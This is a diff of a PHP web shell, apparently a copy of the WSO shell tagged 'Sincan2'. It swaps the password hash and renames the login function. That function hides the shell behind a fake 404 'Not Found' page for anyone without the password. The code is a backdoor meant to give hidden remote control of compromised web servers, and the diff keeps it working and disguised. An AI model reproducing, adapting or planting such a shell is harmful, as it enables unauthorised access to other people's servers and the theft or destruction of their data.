@@ -1,7 +1,7 @@
 <?php 
 /* Sincan2 */
 /*Sincan2*/
-$auth_pass = "027e07f1ee6102251ca45f1259f918e1"; 
+$auth_pass = "b56842b3512017b6e9302680cbbf64b9"; 
 $color = "#00ff00"; 
 $default_action = 'FilesMan'; 
 $default_use_ajax = true; 
@@ -30,7 +30,7 @@ if(get_magic_quotes_gpc()) {
     $_POST = WSOstripslashes($_POST); 
 } 
   
-function wsoLogin() { 
+function koped() { 
     die("<h1>Not Found</h1> 
 <p>The requested URL was not found on this server.</p> 
 <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p> 
@@ -49,7 +49,7 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
     if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) ) 
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
     else
-        wsoLogin(); 
+        koped(); 
   
 if(strtolower(substr(PHP_OS,0,3)) == "win") 
     $os = 'win'; 
